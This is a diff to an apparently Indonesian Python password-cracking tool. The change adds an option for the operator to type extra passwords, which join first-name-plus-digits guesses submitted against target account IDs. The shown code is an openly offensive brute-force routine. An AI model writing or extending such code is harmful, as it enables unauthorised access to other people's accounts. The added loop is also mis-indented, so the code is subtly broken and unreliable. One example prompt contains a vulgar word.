@@ -1175,6 +1175,16 @@ def atur_duluh():
 		ualu.append(bzer)
 	else:
 		ualuh.append('tidak')
+	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
+	if pwplus in ['y','Y']:
+		pwpluss.append('ya')
+		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
+		pwku=input('>> Masukkan Password Tambahan : ')
+		pwkuh=pwku.split(',')
+		for xpw in pwkuh:
+			pwnya.append(xpw)
+	else:
+		pwpluss.append('no')
 	passwrdh()
 
 def passwrdh():
@@ -1207,9 +1217,9 @@ def passwrdh():
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
-				if '><basari><' in pwt:
-					for xpwn in pwn:
-						pwv.append(xpwn)
+					if 'ya' in pwpluss:
+						for xpwd in pwnya:
+						pwv.append(xpwd)
 				else:pass
 				if 'metodh1' in xbz:
 					gas_krek.submit(metodh1,idf,pwv)
